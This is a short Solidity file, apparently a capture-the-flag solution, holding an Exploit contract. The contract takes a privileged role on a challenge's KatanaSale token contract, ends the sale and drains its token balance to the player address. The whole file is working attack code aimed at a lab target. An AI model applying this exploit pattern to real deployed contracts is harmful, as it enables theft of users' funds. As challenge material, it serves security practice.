// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./KatanaSale.sol";
import "./Challenge.sol";

contract Exploit {
    Challenge target;
    KatanaSale katanaSale;

    event balance(string message, uint256 amount);

    constructor(address _target) {
        target = Challenge(_target);
        katanaSale = target.katanaSale();
    }

    function attack() public {
        katanaSale.becomeBeyond("I will check out @BeyondBZH and @gcc_ensibs on X");
        katanaSale.endSale();
        katanaSale.transfer(target.PLAYER(), katanaSale.balanceOf(address(this)));
        emit balance("Balance of target", katanaSale.balanceOf(target.PLAYER()));
        require(target.isSolved());
    }
}
